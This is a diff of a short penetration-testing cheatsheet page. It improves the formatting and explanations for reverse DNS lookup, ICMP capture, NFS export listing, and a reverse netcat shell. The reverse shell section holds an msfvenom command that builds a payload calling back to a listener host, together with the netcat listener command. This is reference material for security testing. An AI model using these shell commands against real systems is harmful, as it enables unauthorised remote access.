@@ -1,40 +1,48 @@
 ---
-title: Cli Commands Collation
-description: Gobuster penetration tests cheatsheet - practical example commands for running Gobuster and getting the most of this powerful tool.
+title: CLI Commands Collation
+description: A collation of handy penetration-testing and networking CLI commands - reverse DNS lookups, packet capture, reverse shells with msfvenom, and NFS enumeration.
 template: comments.html
 tags: [pt, penetration-testing, cli, commands, collation]
 ---
 
-# Cli Commands Collation
+# CLI Commands Collation
 
-## Find PTR Owner - Reversal Look Up
+A running collection of handy one-liners we reach for during penetration tests and network troubleshooting. Replace the example IPs and interfaces with your own.
 
-```bash
+## Find PTR Owner - Reverse Lookup
+
+Query the `PTR`/`NS` records for a reverse DNS zone:
+
+```shell
 dig 0.168.192.in-addr.arpa. NS
 ```
 
-## Listent for Ping/icmp on interface
+## Listen for Ping/ICMP on Interface
 
-```bash
+Capture only ICMP traffic on a given interface:
+
+```shell
 sudo tcpdump ip proto \\icmp -i eth0
 ```
 
 ## Reverse Netcat Shell
 
-Payload R(row)
+Generate the payload (`R` = raw, no encoding or format wrapper):
 
-```bash
+```shell
 msfvenom -p cmd/unix/reverse_netcat lhost=10.11.19.49 lport=4444 R
 ```
 
-listener:
+Start the listener:
 
-```bash
+```shell
 nc -lvp 4444
 ```
 
 ## NFS Show Mount
 
-```bash
+List the NFS exports a host is offering:
+
+```shell
 showmount -e 10.10.87.232
 ```
